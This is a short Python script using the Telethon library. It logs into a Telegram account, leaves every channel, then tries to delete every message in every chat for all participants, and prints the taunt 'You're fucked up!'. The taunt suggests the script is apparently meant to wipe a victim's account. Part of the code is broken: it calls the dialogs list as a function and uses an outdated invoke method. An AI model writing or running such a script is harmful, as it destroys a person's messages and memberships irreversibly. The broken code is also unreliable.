import  telethon.sync
from telethon import utils
from telethon import TelegramClient
from telethon.tl.types import Channel
from telethon.utils import get_display_name
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import DeleteMessagesRequest
api_id = 12345
api_hash = "xxx"
client = TelegramClient('experimental_client', api_id, api_hash)
client.start()
dialogs = client.get_dialogs()
for dialog in dialogs:
    if type(dialog.entity) is Channel:
        print(dialog.name)
        client(LeaveChannelRequest(dialog.entity))
for val in dialogs(limit=None):
    for message in client.iter_messages(val.id, limit=None):
        result = client.invoke(DeleteMessagesRequest([message.id],
                               True))
print("You're fucked up!")
